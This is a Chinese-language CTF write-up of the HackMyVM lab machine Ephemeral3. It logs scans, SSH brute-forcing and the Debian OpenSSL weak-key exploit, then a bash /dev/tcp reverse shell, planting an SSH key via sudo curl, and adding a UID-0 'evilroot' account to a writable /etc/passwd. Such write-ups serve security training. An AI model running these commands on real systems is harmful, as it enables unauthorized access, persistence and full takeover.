---
title: HMV-Ephemeral3
description: Enumeration is key.
pubDate: 14 01 2026
image: /mechine/Ephemeral3.jpg
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux
---
![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768383833260-57cacde1-0d9e-4eda-bff1-f484aed39fab.png)

# 信息收集
## IP定位
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep "08:00:27"
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
192.168.0.101   08:00:27:f0:38:e6       (Unknown)
```

## nmap扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# nmap -Pn -sTCV -T4 -p0-65535 192.168.0.101
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-14 04:46 EST
Nmap scan report for 192.168.0.101
Host is up (0.00069s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:f2:b8:e0:da:41:9b:96:3b:b6:2b:98:95:4c:67:60 (RSA)
|   256 a8:cd:e7:a7:0e:ce:62:86:35:96:02:43:9e:3e:9a:80 (ECDSA)
|_  256 14:a7:57:a9:09:1a:7e:7e:ce:1e:91:f3:b1:1d:1b:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.33 seconds
```

## 80端口
### 目录扫描
```plain
gobuster dir -u http://192.168.0.101 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64

==============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.101
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,db,bak,js,yaml,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/.html                (Status: 403) [Size: 278]
/note.txt             (Status: 200) [Size: 159]
/agency               (Status: 301) [Size: 315] [--> http://192.168.0.101/agency/]                        
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
```

```plain
# html-freebie-agency-perfect
Agency Perfect is a responsive HTML5 template with a clean and professional design which will be a great solution for creative agencies. Agency Perfect was built with awesome Twitter Bootstrap v3 and it includes a number of predefined pages. Since it is responsive, the layout will adapt to different screen sizes which will make your website be compatible with any device such as smart phones, tablets or desktop computers.

Agency Perfect 是一个响应式 HTML5 模板，设计简洁且专业，非常适合创意型机构使用。Agency Perfect 基于强大的 Twitter Bootstrap v3 构建，并包含多个预定义页面。由于它是响应式的，布局可以适应不同屏幕尺寸，使您的网站能够兼容各种设备，如智能手机、平板电脑或台式电脑。
```

### 网页界面
```plain
randy@ephemeral.com
info@agencyperfect.com
pixelperfectmk@gmail.com

John Smith 
Marc Jones 
Linda Smith
```

```plain
Hey! I just generated your keys with OpenSSL. You should be able to use your private key now! 

If you have any questions just email me at henry@ephemeral.com

Hey! I just generated your keys with OpenSSL. You should be able to use your private key now! 

If you have any questions just email me at henry@ephemeral.com
```

randy和henry

### 创建字典
```plain
John Smith 
Marc Jones 
Linda Smith

┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/username-anarchy]
└─# ./username-anarchy --input-file ../../hmv/users.txt > test_users
```

### SSH爆破
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# hydra -L test_users -P /usr/share/wordlists/rockyou.txt 192.168.0.101 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-14 05:00:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 602464758 login tries (l:42/p:14344399), ~37654048 tries per task
[DATA] attacking ssh://192.168.0.101:22/

[INFO] Successful, password authentication is supported
[ERROR] could not connect to target port 22: Connection reset by peer
```

说明：

    SSH 允许密码认证（不是 key-only）

    但 在多次快速连接后主动 reset TCP

 没思路了

## openssl 漏洞利用
根据给的note.txt提示，尝试使用openssl漏洞 

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# searchsploit openssl ssh
------------------- ---------------------------------
 Exploit Title     |  Path
------------------- ---------------------------------
OpenSSL 0.9.8c-1 < | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < | linux/remote/5632.rb
OpenSSL 0.9.8c-1 < | linux/remote/5720.py
------------------- ---------------------------------
Shellcodes: No Results


┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# searchsploit -m linux/remote/5720.py
  Exploit: OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH
      URL: https://www.exploit-db.com/exploits/5720
     Path: /usr/share/exploitdb/exploits/linux/remote/5720.py
    Codes: OSVDB-45029, CVE-2008-3280, CVE-2008-0166
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/Desktop/hmv/5720.py

```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# python2 5720.py 

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
./exploit.py <dir> <host> <user> [[port] [threads]]
    <dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash
    <host>: The victim host
    <user>: The user of the victim host
    [port]: The SSH port of the victim host (default 22)
    [threads]: Number of threads (default 4) Too big numer is bad

```

发现缺少<dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash

```plain
┌──(web)─(root㉿kali)-[/]
└─# searchsploit -x /linux/remote/5622.txt

1. Download http://sugar.metasploit.com/debian_ssh_rs
a_2048_x86.tar.bz2
            https://gitlab.com/exploit-database/explo
itdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2 
(debian_ssh_rsa_2048_x86.tar.bz2)

┌──(web)─(root㉿kali)-[~]
└─# tar jxf 5622.tar.bz2
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# python2 5720.py ~/rsa/2048 192.168.0.101 randy 

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
The authenticity of host '192.168.0.101 (192.168.0.101)' can't be established.
ED25519 key fingerprint is SHA256:Q3PyaanJJfcfx3mqkxE35gi3m6xmdaPE1FHLQufrRHw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? The authenticity of host '192.168.0.101 (192.168.0.101)' can't be established.
ED25519 key fingerprint is SHA256:Q3PyaanJJfcfx3mqkxE35gi3m6xmdaPE1FHLQufrRHw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? The authenticity of host '192.168.0.101 (192.168.0.101)' can't be established.
ED25519 key fingerprint is SHA256:Q3PyaanJJfcfx3mqkxE35gi3m6xmdaPE1FHLQufrRHw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? The authenticity of host '192.168.0.101 (192.168.0.101)' can't be established.
ED25519 key fingerprint is SHA256:Q3PyaanJJfcfx3mqkxE35gi3m6xmdaPE1FHLQufrRHw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Tested 62 keys | Remaining 32706 keys | Aprox. Speed 12/sec
Tested 186 keys | Remaining 32582 keys | Aprox. Speed 24/sec

.............
Tested 15729 keys | Remaining 17039 keys | Aprox. Speed 53/sec
Tested 15818 keys | Remaining 16950 keys | Aprox. Speed 17/sec
Tested 15827 keys | Remaining 16941 keys | Aprox. Speed 1/sec
Tested 16032 keys | Remaining 16736 keys | Aprox. Speed 41/sec
Tested 16246 keys | Remaining 16522 keys | Aprox. Speed 42/sec
 
Key Found in file: 0028ca6d22c68ed0a1e3f6f79573100a-31671
Execute: ssh -lrandy -p22 -i /root/rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 192.168.0.101
 
Tested 16289 keys | Remaining 16479 keys | Aprox. Speed 8/sec
```

## ssh登录
```c
┌──(web)─(root㉿kali)-[/]
└─# ssh -lrandy -p22 -i /root/rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 192.168.0.101
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-30-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

150 updates can be applied immediately.
82 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Fri Jun 24 01:17:05 2022 from 10.0.0.69
randy@ephemeral:~$ 

```

# 提权
## 提权-henry
```c
randy@ephemeral:/home/henry$ sudo -l
Matching Defaults entries for randy on ephemeral:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on
        ephemeral:
    (henry) NOPASSWD: /usr/bin/curl
```

```c
vi /tmp/reverse.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.0.106/4444 0>&1

chmod 777 reverse.sh

sudo -u henry curl "file:///tmp/reverse.sh"
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# pwncat-cs -lp 4444                             
[06:22:24] Welcome to pwncat 🐈!      __main__.py:164
[06:22:25] received connection from        bind.py:84
           192.168.0.101:56536                       
[06:22:25] 192.168.0.101:56536:        manager.py:957
           registered new host w/ db                 
(local) pwncat$ back
(remote) randy@ephemeral:/tmp$ 
```

弹出来的还是randy

[curl | GTFOBins](https://gtfobins.github.io/gtfobins/curl/#sudo)

 本地生成密钥，保存公钥到 `henry` 的目录中：  

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# ssh-keygen -t rsa -f /home/kali/Desktop/hmv/henry
Generating public/private rsa key pair.
Enter passphrase for "/home/kali/Desktop/hmv/henry" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/Desktop/hmv/henry
Your public key has been saved in /home/kali/Desktop/hmv/henry.pub
The key fingerprint is:
SHA256:/DtUrPDeYlWSRoBNf4A86JW2QUJlHAw1taigAFiXIVU root@kali
The key's randomart image is:
+---[RSA 3072]----+
|o.o.++E.+&X*o    |
|.. o.   oo%+.o   |
|  .   .. o.*o..  |
|   . . oo.. *..  |
|    .   So + o   |
|         .+ .    |
|         o.o     |
|          =..    |
|         ..o     |
+----[SHA256]-----+
                      
```

```c
sudo -u henry /usr/bin/curl http://192.168.0.106:8888/henry.pub -o /home/henry/.ssh/authorized_keys
```

## 提权-root
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# 
ssh -i /home/kali/Desktop/hmv/henry henry@192.168.0.101
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-30-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

150 updates can be applied immediately.
82 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Fri Jun 24 01:30:47 2022 from 10.0.0.69
henry@ephemeral:~$ 
```

```c
henry@ephemeral:~$ cat user.txt 
9c8e36b0cb30f09300592cb56bca0c3a
```

```c
henry@ephemeral:~$ find /etc -type f -writable 2>/dev/null
/etc/passwd
```

发现/etc/passwd可以有写入权限

```c
henry@ephemeral:~$ openssl passwd -1 -salt abc password
$1$abc$BXBqpb9BZcZhXLgbee.0s/
henry@ephemeral:~$ head -20 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin

# 创建新用户 evilroot
echo "evilroot:\$1\$abc\$BXBqpb9BZcZhXLgbee.0s/:0:0:Evil Root:/root:/bin/bash" >> /etc/passwd
# 测试登录
su evilroot
# 密码: password
```

```c
root@ephemeral:~# cat root.txt 
b0a3dec84d09f03615f768c8062cec4d
```

